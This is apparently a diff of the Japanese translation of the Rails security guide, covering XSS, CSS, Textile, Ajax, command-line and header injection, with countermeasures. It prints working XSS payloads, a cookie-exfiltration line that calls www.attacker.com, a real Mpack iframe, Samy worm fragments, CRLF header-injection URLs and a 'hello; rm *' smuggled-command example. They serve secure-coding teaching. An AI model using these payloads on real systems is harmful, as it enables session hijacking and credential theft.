+XSS攻撃は次のように行われます。攻撃者が何らかのコードをWebアプリケーションに注入し、後に標的ユーザーのWebページ上に表示されます。XSS事例の多くは警告ボックスを表示する程度のものですが、実際はもっと凶悪です。XSSを使うことで、cookieの盗み出し、セッションのハイジャック、標的ユーザーを偽のWebサイトに誘い込む、攻撃者の利益になるような広告を表示する、Webサイトの要素を書き換えてユーザー情報を盗み出す、あるいはWebブラウザのセキュリティ・ホールを経由して邪悪なソフトウェアをインストールすることもできます。
 
-During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The [Symantec Global Internet Security threat report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf) also documented 239 browser plug-in vulnerabilities in the last six months of 2007. [Mpack](http://pandalabs.pandasecurity.com/mpack-uncovered/) is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit an SQL-Injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites were hacked like this, among them the British government, United Nations, and many more high profile targets.
+2007年後半、Mozillaブラウザで88の脆弱性、Safariで22、IEで18、Operaで12の脆弱性が報告されました。[Symantec Global Internet Security threat report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf) には、2007年後半にブラウザのプラグインで239の脆弱性が報告されています。[Mpack](http://pandalabs.pandasecurity.com/mpack-uncovered/)は大変活発かつ最新の攻撃用フレームワークであり、これらの脆弱性を利用しています。犯罪的なハッカーにとって、WebアプリケーションフレームワークのSQLインジェクションの脆弱性につけ込み、テキストテーブルのカラムに凶悪なコードを注入して回るのはたまらない魅力です。2008年4月には、510,000以上のWebサイトがこの方法でハッキングされ、英国政府、国連など多くの重要なサイトが被害に遭いました。
 
-#### HTML/JavaScript Injection
+#### HTML/JavaScriptインジェクション
 
-The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. _Escaping user input is essential_.
+XSS攻撃に利用されやすい言語は、言うまでもなくクライアント側で最も普及している言語であるJavaScriptであり、しばしばHTMLと組み合わせて攻撃に利用されます。**攻撃を避けるにはユーザー入力をエスケープする**必要があります。
 
-Here is the most straightforward test to check for XSS:
+XSSをチェックする最も簡単なテストをご紹介します。
 
 ```html
 <script>alert('Hello');</script>
 ```
 
-This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:
+このJavaScriptコードを実行すると、警告ボックスが1つ表示されるだけです。次の例では、見かけの動作はまったく同じですが、通常ではありえない場所にコードが置かれています。
 
 ```html
 <img src=javascript:alert('Hello')>
 <table background="javascript:alert('Hello')">
 ```
 
-##### Cookie Theft
+##### Cookie窃盗
 
-These examples don't do any harm so far, so let's see how an attacker can steal the user's cookie (and thus hijack the user's session). In JavaScript you can use the document.cookie property to read and write the document's cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The document.cookie property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:
+先ほどの例では何の害も生じないので、今度は攻撃者がユーザーのcookieを盗み出す手法をご紹介します (攻撃者はこれを利用してユーザーのセッションをハイジャックします)。JavaScriptでは、`document.cookie`プロパティを利用してドキュメントのcookieを読み書きできます。JavaScriptでは同一生成元ポリシーが強制的に適用されます。これは、あるドメインから送り込まれたスクリプトからは、別のドメインのcookieにアクセスできないようにするポリシーです。`document.cookie`プロパティには、生成元webサーバーのcookieが保存されています。しかし、HTMLドキュメントに直接コードを埋め込むと(XSSによってこれが生じることがあります)、このプロパティを読み書きできてしまいます。このコードを自分のWebアプリケーションの適当な場所に手動で注入してみれば、そのページに含まれている自身のcookieが表示されることを確認できます。
 
-```
+```html
 <script>document.write(document.cookie);</script>
 ```
 
-For an attacker, of course, this is not useful, as the victim will see their own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review their web server's access log files to see the victim's cookie.
+もちろん、攻撃者にしてみれば標的ユーザーが自分で自分のcookieを表示したところで何の意味もありません。次の例では http://www.attacker.com/ というURLから画像とcookieを読み込みます。言うまでもありませんが、このURLは実際には存在しませんので、ブラウザには何も表示されません(訳注: 現在は売り物件のWebページがあるようです)。ただし攻撃者がWebサーバーのアクセスログファイルを調べて標的ユーザーのcookieを参照する可能性もあります。
 
 ```html
 <script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
 ```
 
-The log files on www.attacker.com will read like this:
+www.attacker.com サイト上のログファイルには以下のように記録されます。
 
 ```
 GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
 ```
 
-You can mitigate these attacks (in the obvious way) by adding the **httpOnly** flag to cookies, so that document.cookie may not be read by JavaScript. HTTP only cookies can be used from IE v6.SP1, Firefox v2.0.0.5, Opera 9.5, Safari 4, and Chrome 1.0.154 onwards. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies [will still be visible using Ajax](https://www.owasp.org/index.php/HTTPOnly#Browsers_Supporting_HttpOnly), though.
+この攻撃をある程度緩和するためには[httpOnly](http://dev.rubyonrails.org/ticket/8895)フラグをcookieに追加します。これにより、`document.cookie`をJavaScriptで読み出せなくなります。HTTP only cookieはIE v6.SP1、Firefox v2.0.0.5、Opera 9.5以降で利用できます。Safariはまだこのフラグを検討中であり、このオプションは無視されます。ただしWebTVやMac版IE 5.5などの古いブラウザでは、ページ上での読み込みに失敗します。なお、[Ajaxを使うとcookieが表示可能になる](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/)ことにもご注意ください。
 
-##### Defacement
+##### Webページの汚損
 
-With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers web site to steal the cookie, login credentials, or other sensitive data. The most popular way is to include code from external sources by iframes:
+Webページを書き換える (汚損) ことで、偽の情報を表示したり、標的ユーザーを攻撃者の偽サイトに誘い込んでcookieやログイン情報などの重要データを盗み出すなどのさまざまな攻撃が可能になります。最も多い攻撃は、iframeタグを悪用して外部のコードをWebページに含める方法です。
 
 ```html
 <iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
 ```
 
-This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iframe is taken from an actual attack on legitimate Italian sites using the [Mpack attack framework](http://isc.sans.org/diary.html?storyid=3015). Mpack tries to install malicious software through security holes in the web browser - very successfully, 50% of the attacks succeed.
+このコードによって、外部にある任意のHTMLやJavaScriptが読み込まれ、Webサイトの一部として埋め込まれます。上のiframeは、[Mpack攻撃フレームワーク](http://isc.sans.org/diary.html?storyid=3015)を使ってイタリアにあるWebサイトへの攻撃で実際に用いられたものです。MpackはWebブラウザのセキュリティホールを介して邪悪なソフトウェアをインストールしようとします。そして攻撃の成功率は50%を誇っています。
 
-A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site's original, but transmits the user name and password to the attacker's site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.
+さらに特殊な攻撃としては、Webサイト全体を上に重ねて表示したりログインフォームを表示したりするという手口があります。これらは元のサイトと一見そっくりですが、入力されたユーザー名とパスワードを密かに攻撃者のサイトに送信します。あるいは、CSSやJavaScriptを駆使してWebアプリケーション上の本物のリンクを隠して別のリンクを表示し、ユーザーを偽のサイトにリダイレクトするという手法もあります。
 
-Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated that "George Bush appointed a 9 year old boy to be the chairperson...":
+リフレクションインジェクション (Reflected injection) 攻撃も同様の攻撃です。後で標的ユーザーに表示するペイロードを実際には保存せず、代わりにURLに長大な文字列として仕込んでおく手法です。特に検索フォームで検索文字列のエスケープに失敗します。以下のリンク先には、「ジョージ・ブッシュが9歳の男の子を議長に任命」と書かれたページがありました。
 
 ```
 http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
   <script src=http://www.securitylab.ru/test/sc.js></script><!--
 ```
 
-##### Countermeasures
+##### 対応策
 
-_It is very important to filter malicious input, but it is also important to escape the output of the web application_.
+**悪意のある入力をフィルタすることがきわめて重要です。Webアプリケーションの出力をエスケープすることも同様に重要です**。
 
-Especially for XSS, it is important to do _permitted input filtering instead of restricted_. Permitted list filtering states the values allowed as opposed to the values not allowed. Restricted lists are never complete.
+特にXSSの場合、**ブラックリスト方式ではなくホワイトリスト方式で入力をフィルタすることが絶対重要です**。ホワイトリストフィルタでは特定の値のみが許可され、それ以外の値はすべて拒否されます。ブラックリスト方式を元にしている限り、必ず将来漏れが生じます。
 
-Imagine a restricted list deletes "script" from the user input. Now the attacker injects "&lt;scrscriptipt&gt;", and after the filter, "&lt;script&gt;" remains. Earlier versions of Rails used a restricted list approach for the strip_tags(), strip_links() and sanitize() method. So this kind of injection was possible:
+ユーザー入力から「script」という文字を除去するのに使われているブラックリストがあるとしましょう。それなら攻撃者は次には「`<scrscriptipt>`」という文字を入力するでしょう。この文字がフィルタされると「`<script>`」という文字がそっくり残ってしまいます。以前のRailsでは`strip_tags()`、`strip_links()`、`sanitize()`メソッドでブラックリスト的アプローチが使われていたため、当時は以下のような攻撃が可能でした。
 
 ```ruby
 strip_tags("some<<b>script>alert('hello')<</b>/script>")
 ```
 
-This returned "some&lt;script&gt;alert('hello')&lt;/script&gt;", which makes an attack work. That's why a permitted list approach is better, using the updated Rails 2 method sanitize():
+フィルタから返される「`some<script>alert('hello')</script>`」という文字列の攻撃能力は失われていません。だからこそ、ホワイトリストを用いるフィルタリングをおすすめします。ホワイトリストによるフィルタは、Rails 2でアップデートされた`sanitize()`メソッドで使われています。
 
 ```ruby
 tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
 s = sanitize(user_input, tags: tags, attributes: %w(href title))
 ```
 
-This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.
+この方法なら指定されたタグのみが許可されるため、あらゆる攻撃方法や邪悪なタグに対してフィルタが健全に機能します。
 
-As a second step, _it is good practice to escape all output of the application_, especially when re-displaying user input, which hasn't been input-filtered (as in the search form example earlier on). _Use `escapeHTML()` (or its alias `h()`) method_ to replace the HTML input characters &amp;, &quot;, &lt;, and &gt; by their uninterpreted representations in HTML (`&amp;`, `&quot;`, `&lt;`, and `&gt;`).
+第2段階として、**Webアプリケーションからの出力をもれなくエスケープする**ことが優れた対策となります。これは特に、ユーザー入力の段階でフィルタされなかった文字列がWeb画面に再表示されてしまうようなことがあった場合に有効です。**`escapeHTML()` (または別名の`h()`) メソッド**を用いて、HTML入力文字「`&`」「`"`」「`<`」「`>`」を、無害なHTML表現形式(`&amp;`、`&quot;`、`&lt;`、`&gt;`) に置き換えます。
 
-##### Obfuscation and Encoding Injection
+##### 攻撃の難読化とエンコーディングインジェクション
 
-Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in UTF-8 encoding:
+従来のネットワークトラフィックは西欧文化圏のアルファベットがほとんどでしたが、それ以外の言語を伝えるためにUnicodeなどの新しいエンコード方式が使われるようになってきました。しかしこれはWebアプリケーションにとっては新たな脅威となるかもしれません。異なるコードでエンコードされた中に、ブラウザでは処理可能だがサーバーでは処理されないような悪意のあるコードが潜んでいるかもしれないからです。UTF-8による攻撃方法の例を以下に示します。
 
 ```
 <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
   &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
 ```
 
-This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus "get to know your enemy", is the [Hackvertor](https://hackvertor.co.uk/public). Rails' sanitize() method does a good job to fend off encoding attacks.
+上の例を実行するとメッセージボックスが表示されます。なお、これは上のsanitize()フィルタで認識されます。[Hackvertor](https://hackvertor.co.uk/public)は文字列の難読化とエンコードを行なう優れたツールであり、「敵を知る」のに最適です。Railsの`sanitize()`メソッドは、このようなエンコーディング攻撃をかわします。
 
-#### Examples from the Underground
+#### アンダーグラウンドでの攻撃例
 
-_In order to understand today's attacks on web applications, it's best to take a look at some real-world attack vectors._
+**近年におけるWebアプリケーションへの攻撃を理解するには、実際の攻撃例を目にするのがベストです。**
 
-The following is an excerpt from the [Js.Yamanner@m](http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1) Yahoo! Mail [worm](http://groovin.net/stuff/yammer.txt). It appeared on June 11, 2006 and was the first webmail interface worm:
+以下は[Js.Yamanner@m](http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1) Yahoo! Mail [ワーム](http://groovin.net/stuff/yammer.txt) からの抜粋です。この攻撃は2006年6月11日に行われたもので、Webメールインターフェイスを利用したワームの最初の事例です。
 
 ```
 <img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
@@ -815,127 +775,128 @@ The following is an excerpt from the [Js.Yamanner@m](http://www.symantec.com/sec
   var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
 ```
 
-The worms exploit a hole in Yahoo's HTML/JavaScript filter, which usually filters all targets and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why restricted list filters are never complete and why it is hard to allow HTML/JavaScript in a web application.
+このワームはYahooのHTML/JavaScriptフィルタの抜け穴を利用していました。このフィルタは元来、JavaScriptが仕込まれる可能性のある`target`属性と`onload`属性をすべてフィルタするようになっていました。しかし残念ながらこのフィルタは1度しか実行されなかったため、ワームが潜むonload属性が除去されずにそのまま残ってしまいました。この事例からも、完璧なブラックリストフィルタは永遠にありえないこと、そしてHTML/JavaScriptをWebアプリケーションで許可することに困難が伴う理由をおわかりいただけると思います。
 
-Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details on [Rosario Valotta's paper](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/). Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.
+webmailワームの他の概念実証的な事例としてNdujaを取り上げます。詳細については[Rosario Valotta'の論文](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/)を参照してください。どちらのwebmailワームもメールアドレスの収集が狙いで、犯罪的ハッカーが不正な収入を得るのに使われることがあります。
 
-In December 2006, 34,000 actual user names and passwords were stolen in a [MySpace phishing attack](http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html). The idea of the attack was to create a profile page named "login_home_index_html", so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.
+2006年12月、実在する34,000人のユーザー名とパスワードが[MySpaceへのフィッシング攻撃](http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html)によって盗み出されました。この攻撃では「login_home_index_html」という名前をURLに持つプロファイルページが捏造され、それによってこのURLはユーザーからは何の変哲もないように見えました。MySpaceの本物のWebページコンテンツは特殊なHTML/CSSによって覆い隠され、独自の偽ログインページを代りに表示しました。
 
-### CSS Injection
+### CSSインジェクション
 
-INFO: _CSS Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari, and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application._
+INFO: **CSSインジェクションは実際にはJavaScriptのインジェクションです（IEや特定のバージョンのSafariなどではCSSに含まれるJavaScriptの実行が許可されています）。WebアプリケーションでカスタムCSSを許可する前によく考えましょう**。
 
-CSS Injection is explained best by the well-known [MySpace Samy worm](https://samy.pl/myspace/tech.html). This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, which created so much traffic that MySpace went offline. The following is a technical explanation of that worm.
+CSSインジェクションの説明に最適なのは、かの有名な[MySpace Samyワーム](https://samy.pl/popular/tech.html)です。このワームは、攻撃者であるSamyのプロファイルページを開くだけで自動的にSamyに友達リクエストを送信するというものです。他愛もないいたずらだったかもしれませんが、Samyのもとには数時間のうちに百万件以上の友達リクエストが集まり、それによってMySpaceに膨大なトラフィックが発生してサイトがオフラインになってしまいました。以下はこのワームに関する技術的な解説です。
 
-MySpace blocked many tags, but allowed CSS. So the worm's author put JavaScript into CSS like this:
+MySpaceでは多くのタグをブロックしていましたが、CSSについては禁止していなかったので、ワームの作者はCSSに以下のようなJavaScriptを仕込みました。
 
 ```html
 <div style="background:url('javascript:alert(1)')">
 ```
 
-So the payload is in the style attribute. But there are no quotes allowed in the payload, because single and double quotes have already been used. But JavaScript has a handy eval() function which executes any string as code.
+ここでスクリプトの正味の部分(ペイロード)はstyle属性に置かれます。一重引用符と二重引用符が既に両方使われているので、このペイロードでは引用符を使えません。しかしJavaScriptにはどんな文字列もコードとして実行できてしまう便利なeval()関数があります。この関数は強力ですが危険です。
 
 ```html
 <div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
 ```
 
-The eval() function is a nightmare for restricted list input filters, as it allows the style attribute to hide the word "innerHTML":
+`eval()`関数はブラックリスト方式の入力フィルタを実装した開発者にとってはまさに悪夢です。この関数を使われてしまうと、たとえば以下のように「innerHTML」という単語を`style`属性に隠しておくことができてしまうからです。
 
 ```
 alert(eval('document.body.inne' + 'rHTML'));
 ```
 
-The next problem was MySpace filtering the word "javascript", so the author used "java&lt;NEWLINE&gt;script" to get around this:
+次の問題では、MySpaceは"javascript"という単語をフィルタしていたにもかかわらず、「`java<NEWLINE>script`」と書くことでこのフィルタを突破されてしまいました。
 
 ```html
-<div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')">
+<div id="mycode" expr="alert('hah!')" style="background:url('java
+ script:eval(document.all.mycode.expr)')">
 ```
 
-Another problem for the worm's author was the [CSRF security tokens](#cross-site-request-forgery-csrf). Without them he couldn't send a friend request over POST. He got around it by sending a GET to the page right before adding a user and parsing the result for the CSRF token.
+さらに次の問題では、ワームの作者が[CSRFセキュリティトークン](#クロスサイトリクエストフォージェリ-csrf)を利用していました。これがなければ友達リクエストをばらまくということはできない相談だったでしょう。ワームの作者は、ユーザーが追加される直前にページに送信されたGETリクエストの結果を解析してCSRFトークンを手に入れていました。
 
-In the end, he got a 4 KB worm, which he injected into his profile page.
+最終的に4KBサイズのワームができあがり、作者は自分のプロファイルページにこれを注入しました。
 
-The [moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html) CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers (Firefox, for example).
+[moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html)というCSSプロパティは、FirefoxなどのGeckoベースのブラウザではCSS経由でJavaScriptを注入する手段に使われる可能性があることが判明しています。
 
-#### Countermeasures
+#### 対応策
 
-This example, again, showed that a restricted list filter is never complete. However, as custom CSS in web applications is a quite rare feature, it may be hard to find a good permitted CSS filter. _If you want to allow custom colors or images, you can allow the user to choose them and build the CSS in the web application_. Use Rails' `sanitize()` method as a model for a permitted CSS filter, if you really need one.
+繰り返しますが、ブラックリストによる完璧なフィルタは決して作れません。しかしWebアプリケーションでカスタムCSSを使える機能はめったにないので、これを効果的にフィルタできるホワイトリストCSSフィルタを見つけるのは難しいでしょう。**Webアプリケーションの色や画像をカスタマイズできるようにしたいのであれば、ユーザーに色や画像を選ばせ、Webアプリケーションの側でCSSをビルドするようにしましょう**。ユーザーがCSSを直接カスタマイズできるような作りにはしないでください。どうしても必要であれば、ホワイトリストベースのCSSフィルタとしてRailsの`sanitize()`メソッドをお使いください。
 
-### Textile Injection
+### テキスタイルインジェクション（Textile Injection)
 
-If you want to provide text formatting other than HTML (due to security), use a mark-up language which is converted to HTML on the server-side. [RedCloth](http://redcloth.org/) is such a language for Ruby, but without precautions, it is also vulnerable to XSS.
+セキュリティ上の理由からHTML以外のテキストフォーマット機能を提供するのであれば、何らかのマークアップ言語を採用し、それをサーバー側でHTMLに変換するようにしてください。[RedCloth](http://redcloth.org/)はRuby用に開発されたマークアップ言語の一種ですが、注意して使わないとXSSに対しても脆弱になります。
 
-For example, RedCloth translates `_test_` to &lt;em&gt;test&lt;em&gt;, which makes the text italic. However, up to the current version 3.0.4, it is still vulnerable to XSS. Get the [all-new version 4](http://www.redcloth.org) that removed serious bugs. However, even that version has [some security bugs](http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html), so the countermeasures still apply. Here is an example for version 3.0.4:
+例を挙げます。RedClothは `_test_`というマークアップを`<em>test<em>`に変換します。この箇所のテキストはイタリックになります。しかし、執筆当時の最新バージョンである3.0.4までのRedClothはXSSに関しても脆弱でした。この重大なバグを取り除くには[最新のバージョン4](http://www.redcloth.org)を入手してください。しかし新しいバージョンでも[若干のセキュリティバグ](http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html)が見つかったので、対応策は未だに欠かせません。バージョン3.0.4の例を以下に示します。
 
 ```ruby
 RedCloth.new('<script>alert(1)</script>').to_html
 # => "<script>alert(1)</script>"
 ```
 
-Use the :filter_html option to remove HTML which was not created by the Textile processor.
+テキスタイルプロセッサによって作成されていないHTMLを除去するには、`:filter_html`オプションをお使いください。
 
 ```ruby
 RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
 # => "alert(1)"
 ```
 
-However, this does not filter all HTML, a few tags will be left (by design), for example &lt;a&gt;:
+ただしこのメソッドでは、仕様上一部のHTMLタグ(`<a>`など)が除去されません。
 
 ```ruby
 RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
 # => "<p><a href="javascript:alert(1)">hello</a></p>"
 ```
 
-#### Countermeasures
+#### 対応策
 
-It is recommended to _use RedCloth in combination with a permitted input filter_, as described in the countermeasures against XSS section.
+XSS対応策で既に述べたとおり、**RedClothは必ずホワイトリストフィルタと組み合わせてお使いください**。
 
-### Ajax Injection
+### Ajaxインジェクション
 
-NOTE: _The same security precautions have to be taken for Ajax actions as for "normal" ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn't render a view._
+NOTE: **Ajaxでも、通常のWebアプリケーション開発上で必要となるセキュリティ上の注意と同様の注意が必要です。ただし1つ例外があります。ページヘの出力は、アクションがビューをレンダリングしない場合であってもエスケープが必要です。**
 
-If you use the [in_place_editor plugin](https://rubygems.org/gems/in_place_editing), or actions that return a string, rather than rendering a view, _you have to escape the return value in the action_. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.
+[in_place_editorプラグイン](http://dev.rubyonrails.org/browser/plugins/in_place_editing)や、ビューをレンダリングする代りに文字列を返すようなアクションを使う場合は、**アクションで返される値を確実にエスケープする必要があります**。もしXSSで汚染された文字列が戻り値に含まれていると、ブラウザで表示されたときに悪意のあるコードが実行されてしまいます。入力値はすべて`h()`メソッドでエスケープしてください。
 
-### Command Line Injection
+### コマンドラインインジェクション
 
-NOTE: _Use user-supplied command line parameters with caution._
+NOTE: **ユーザーが入力したデータをコマンドラインのオプションに使う場合は十分に注意してください。**
 
-If your application has to execute commands in the underlying operating system, there are several methods in Ruby: exec(command), syscall(command), system(command) and `command`. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (;) or a vertical bar (|).
+Webアプリケーションが背後のOSコマンドを実行しなければならない場合、Rubyには`exec(コマンド)`、`syscall(コマンド)`、`system(コマンド)`、そしてバッククォート記法という方法が用意されています。特に、これらのコマンド全体または一部を入力できる可能性に注意が必要です。ほとんどのシェルでは、コマンドにセミコロン`;`や垂直バー`|`を追加して別のコマンドを簡単に結合できてしまいます。
 
-A countermeasure is to _use the `system(command, parameters)` method which passes command line parameters safely_.
+対応策は、**コマンドラインのパラメータを安全に渡せる`system(コマンド, パラメータ)`メソッドを使うことです**。
 
 ```ruby
 system("/bin/echo","hello; rm *")
-# prints "hello; rm *" and does not delete files
+# "hello; rm *"を実行してもファイルは削除されない
 ```
 
 
-### Header Injection
+### ヘッダーインジェクション
 
-WARNING: _HTTP headers are dynamically generated and under certain circumstances user input may be injected. This can lead to false redirection, XSS, or HTTP response splitting._
+WARNING: **HTTPヘッダは動的に生成されるものであり、特定の状況ではヘッダにユーザー入力が注入されることがあります。これを使って、にせのリダイレクト、XSS、HTTPレスポンス分割攻撃が行われる可能性があります。**
 
-HTTP request headers have a Referer, User-Agent (client software), and Cookie field, among others. Response headers for example have a status code, Cookie, and Location (redirection target URL) field. All of them are user-supplied and may be manipulated with more or less effort. _Remember to escape these header fields, too._ For example when you display the user agent in an administration area.
+HTTPリクエストヘッダで使われているフィールドの中には`Referer`、`User-Agent` (クライアント側ソフトウェア)、`Cookie`フィールドがあります。`Response`ヘッダーには、たとえばステータスコード、`Cookie`フィールド、`Location`フィールド (リダイレクト先を表す) があります。これらのフィールド情報はユーザー側から提供されるものであり、さほど手間をかけずに操作できてしまいます。**これらのフィールドもエスケープしてください**。エスケープが必要になるのは、管理画面で`User-Agent`ヘッダを表示する場合などが考えられます。
 
-Besides that, it is _important to know what you are doing when building response headers partly based on user input._ For example you want to redirect the user back to a specific page. To do that you introduced a "referer" field in a form to redirect to the given address:
+さらに、**ユーザー入力の一部を取り入れたレスポンスヘッダを生成する場合は、何が行われているのかを正確に把握することが重要です**。たとえば、ユーザーを特定のページにリダイレクトしてから元のページに戻したいとします。このとき、`referer`フィールドをフォームに導入して、指定のアドレスにリダイレクトしたとします。
 
 ```ruby
 redirect_to params[:referer]
 ```
 
-What happens is that Rails puts the string into the Location header field and sends a 302 (redirect) status to the browser. The first thing a malicious user would do, is this:
+このとき、Railsはその文字列を`Location`ヘッダフィールドに入れて302(リダイレクト)ステータスをブラウザに送信します。悪意のあるユーザーがこのとき最初に行なうのは、以下のような操作です。
 
 ```
 http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
 ```
 
-And due to a bug in (Ruby and) Rails up to version 2.1.2 (excluding it), a hacker may inject arbitrary header fields; for example like this:
+Rails 2.1.2より前のバージョン(およびRuby)に含まれるバグが原因で、ハッカーが以下のように任意のヘッダを注入できてしまう可能性があります。
 
 ```
 http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
 http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
 ```
 
-Note that "%0d%0a" is URL-encoded for "\r\n" which is a carriage-return and line-feed (CRLF) in Ruby. So the resulting HTTP header for the second example will be the following because the second Location header field overwrites the first.
+上のURLにおける`%0d%0a`は`\r\n`がURLエンコードされたものであり、RubyにおけるCRLF文字です。2番目の例では2つ目の`Location`ヘッダーフィールドが1つ目のものを上書きするため、以下のようなHTTPヘッダーが生成されます。
 
 ```
 HTTP/1.1 302 Moved Temporarily
@@ -943,44 +904,37 @@ HTTP/1.1 302 Moved Temporarily
 Location: http://www.malicious.tld
 ```
 
-So _attack vectors for Header Injection are based on the injection of CRLF characters in a header field._ And what could an attacker do with a false redirection? They could redirect to a phishing site that looks the same as yours, but ask to login again (and sends the login credentials to the attacker). Or they could install malicious software through browser security holes on that site. Rails 2.1.2 escapes these characters for the Location field in the `redirect_to` method. _Make sure you do it yourself when you build other header fields with user input._
+**ヘッダーインジェクションにおける攻撃方法とは、ヘッダーにCRLF文字を注入することです**。攻撃者は偽のリダイレクトでどんなことができてしまうのでしょうか。攻撃者は、ユーザーをフィッシングサイトにリダイレクトし(フィッシングサイトの見た目は本物そっくりに作っておきます)、ユーザーを再度ログインさせてそのログイン情報を攻撃者に送信する可能性があります。あるいは、フィッシングサイトからブラウザのセキュリティホールを経由して邪悪なソフトウェアを注入するかもしれません。Rails 2.1.2では`redirect_to`メソッドの`Location`フィールドからこれらの文字をエスケープするようになりました。**ユーザー入力を用いて通常以外のヘッダーフィールドを作成する場合には、CRLFのエスケープを必ず自分で実装してください**。
 
-#### Response Splitting
+#### レスポンス分割
 
-If Header Injection was possible, Response Splitting might be, too. In HTTP, the header block is followed by two CRLFs and the actual data (usually HTML). The idea of Response Splitting is to inject two CRLFs into a header field, followed by another response with malicious HTML. The response will be:
+ヘッダーインジェクションが実行可能になってしまっている場合、レスポンス分割(response splitting)攻撃も同様に実行可能になっている可能性があります。HTTPのヘッダーブロックの後ろには2つのCRLFが置かれてヘッダーブロックの終了を示し、その後ろに実際のデータ(通常はHTML)が置かれます。レスポンス分割とは、ヘッダーフィールドに2つのCRLFを注入し、その後ろに邪悪なHTMLを配置するという手法です。このときのレスポンスは以下のようになります。
 
 ```
-HTTP/1.1 302 Found [First standard 302 response]
+HTTP/1.1 302 Found [最初は通常の302レスポンス]
 Date: Tue, 12 Apr 2005 22:09:07 GMT
 Location: Content-Type: text/html
 
 
-HTTP/1.1 200 OK [Second New response created by attacker begins]
+HTTP/1.1 200 OK [ここより下は攻撃者によって作成された次の新しいレスポンス]
 Content-Type: text/html
 
 
-&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [Arbitrary malicious input is
-Keep-Alive: timeout=15, max=100         shown as the redirected page]
+&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [任意の邪悪な入力が
+Keep-Alive: timeout=15, max=100         リダイレクト先のページとして表示される]
 Connection: Keep-Alive
 Transfer-Encoding: chunked
 Content-Type: text/html
 ```
 
